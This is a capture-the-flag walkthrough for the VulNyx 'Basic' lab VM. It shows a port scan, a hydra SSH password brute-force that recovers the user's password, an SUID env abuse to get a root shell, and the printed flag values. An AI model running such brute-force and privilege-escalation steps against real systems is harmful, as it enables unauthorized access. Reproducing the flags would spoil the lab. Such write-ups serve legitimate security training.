# VulNyx - Basic

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -T4 192.168.11.12 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 17:18 +07
Nmap scan report for 192.168.11.12
Host is up (0.0030s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
631/tcp open  ipp     CUPS 2.3
|_http-title: Inicio - CUPS 2.3.3op2
|_http-server-header: CUPS/2.3 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:59:60:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```
![web](/walkthroughs/vulnyx/low-difficulty/basic/web.png)
![web port 631](/walkthroughs/vulnyx/low-difficulty/basic/web-631.png)

### Shell (dimitri)
![printers](/walkthroughs/vulnyx/low-difficulty/basic/printer.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.11.12 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-05 17:31:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.11.12:22/
[STATUS] 453.00 tries/min, 453 tries in 00:01h, 14343983 to do in 527:45h, 27 active
[22][ssh] host: 192.168.11.12   login: dimitri   password: mememe
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 24 final worker threads did not complete until end.
[ERROR] 24 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-05 17:33:12
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh dimitri@192.168.11.12 
The authenticity of host '192.168.11.12 (192.168.11.12)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.11.12' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dimitri@192.168.11.12's password: 
dimitri@basic:~$ id ; hostname
uid=1000(dimitri) gid=1000(dimitri) grupos=1000(dimitri)
basic
```

### Privilege Escalation
#### SUID Enumeration
```bash
dimitri@basic:~$ ls -la
total 24
drwx------ 2 dimitri dimitri 4096 oct 26  2023 .
drwxr-xr-x 3 root    root    4096 oct 26  2023 ..
lrwxrwxrwx 1 dimitri dimitri    9 oct 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dimitri dimitri  220 ene 15  2023 .bash_logout
-rw-r--r-- 1 dimitri dimitri 3526 ene 15  2023 .bashrc
-rw-r--r-- 1 dimitri dimitri  807 ene 15  2023 .profile
-r-------- 1 dimitri dimitri   33 oct 26  2023 user.txt
dimitri@basic:~$ sudo -l
-bash: sudo: orden no encontrada
dimitri@basic:~$ find / -perm -4000 2>/dev/null
/usr/bin/env
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

#### Abuse
![reverse-shell](/walkthroughs/vulnyx/low-difficulty/basic/reverse-shell.png)
```bash 
dimitri@basic:~$ /usr/bin/env /bin/sh -p
# id ; hostname
uid=1000(dimitri) gid=1000(dimitri) euid=0(root) grupos=1000(dimitri)
basic
```

#### Flag
```bash
# find / -name root.txt -o -name user.txt | xargs cat
551df067bd06f13f1c092743493de034
f17d2f67c468d15600d8fc0b2ebc1d8c
```

***You are welcome!***
